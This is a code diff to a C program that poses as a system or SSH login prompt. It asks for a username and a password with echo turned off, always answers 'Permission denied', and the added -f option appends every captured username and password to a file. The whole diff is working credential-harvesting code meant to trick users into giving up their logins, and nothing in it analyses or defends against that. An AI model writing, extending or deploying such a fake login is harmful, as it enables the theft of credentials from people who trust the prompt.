@@ -48,6 +48,7 @@
 #include <unistd.h>
 #include <errno.h>
 #include <signal.h>
+#include <getopt.h>
 
 #define F(x) __FILE__":%d:%s: " x, __LINE__, __func__
 
@@ -61,8 +62,11 @@ char *vprompt(char *buffer, size_t sz, int flags, const char *fmt, va_list args)
     struct termios saved_tty;
     ssize_t n_read;
 
-    vfprintf(stderr, fmt, args);
+	/* print the prompt and flush buffers */
+    vprintf(fmt, args); fflush(stdout);
+
     if (flags & FLAG_RAW) {
+	/* put in no echo mode */
         struct termios tty;
         tcgetattr(0, &saved_tty);
         tty = saved_tty;
@@ -71,15 +75,23 @@ char *vprompt(char *buffer, size_t sz, int flags, const char *fmt, va_list args)
     }
 
     n_read = read(0, buffer, sz-1);
+
     if (flags & FLAG_RAW) {
+	/* restore tty mode */
         tcsetattr(0, TCSAFLUSH, &saved_tty);
         puts(""); fflush(stdout);
     }
+
     if (n_read < 0) {
+	/* read error */
         return NULL;
     }
 
-    while(n_read > 0 && buffer[n_read-1] == '\n') n_read--;
+	/* erase final \n character */
+    while(n_read > 0 && buffer[n_read-1] == '\n')
+		n_read--;
+
+	/* finish the string with the null char */
     buffer[n_read] = 0;
 
     return buffer;
@@ -103,7 +115,27 @@ int main(int argc, char **argv)
     int i = 0, res;
     char *pass[10];
     char *hostname;
+    int opt;
+    FILE *out = NULL;
 
+    while ((opt = getopt(argc, argv, "f:")) != EOF) {
+    	switch(opt) {
+    	case 'f': out = fopen(optarg, "a");
+    		if (!out) {
+    			fprintf(stderr,
+    				F("%s: %s(errno=%d)\n"),
+    				optarg, strerror(errno), errno);
+    			exit(EXIT_FAILURE);
+    		}
+    		break;
+    	} /* switch */
+    } /* while */
+
+    /* skipt command line parameters */
+    argc -= optind;
+    argv += optind;
+
+    /* collect to use hostname where appropiate */
     res = gethostname(line, sizeof line);
     if (res < 0) {
         fprintf(stderr,
@@ -111,39 +143,55 @@ int main(int argc, char **argv)
                 strerror(errno), errno);
         exit(EXIT_FAILURE);
     }
-
     hostname = strdup(line);
 
     switch(argc) {
-    case 2: username = argv[1];
-    case 1: break;
-    default:
+    case 1: username = argv[0];  /* we already have a user name */
+    case 0: break; /* no username */
+    default: /* more than one parameter left */
         fprintf(stderr, F("Usage: login [ user ]\n"));
         exit(EXIT_FAILURE);
     }
 
+    /* ignore quit and interrupt signals from terminal */
     signal(SIGINT, SIG_IGN);
     signal(SIGQUIT, SIG_IGN);
 
-    do {
+    for(;;) {
+	/* inter login delay timeouts */
         static char slp[] = { 0, 1, 1, 2, 3, 5, 8, 13, 21, 34, 55, };
+		
         if (!username) {
+			/* if no username yet, we have to use one */
             do {
                 prompt(line, sizeof line, 0, "login: ");
                 username = strdup(line);
             } while (strcmp(username, "") == 0);
         }
+
+	/* ask for a password */
         prompt(line, sizeof line, FLAG_RAW, "%s@%s's password: ",
                 username, hostname);
         pass[i] = strdup(line);
-        sleep(slp[i]);
-        fprintf(stderr, "Permission denied, please try again\n");
-    } while (++i < N_TRIES);
 
+	/* don't check, always invalid */
+        sleep(slp[i]); /* wait */
+
+        if (++i >= N_TRIES) break;
+
+	/* write message to user */
+	fprintf(stderr, "Permission denied, please try again\n");
+    } /* loop */
+
+    /* final message */
     fprintf(stderr, "Permission denied (publickey,password)\n");
-    int n = i;
-    printf("Usuario: %s\n", username);
-    for (i = 0; i < n; i++) {
-        printf("Password#%d: %s\n", i, pass[i]);
-    }
+
+    if (out) {
+	/* if we have a save file */
+	int n = i;
+	fprintf(out, "Usuario: %s\n", username);
+	for (i = 0; i < n; i++) {
+	    fprintf(out, "Password#%d: %s\n", i, pass[i]);
+	}
+    } /* if */
 } /* main */
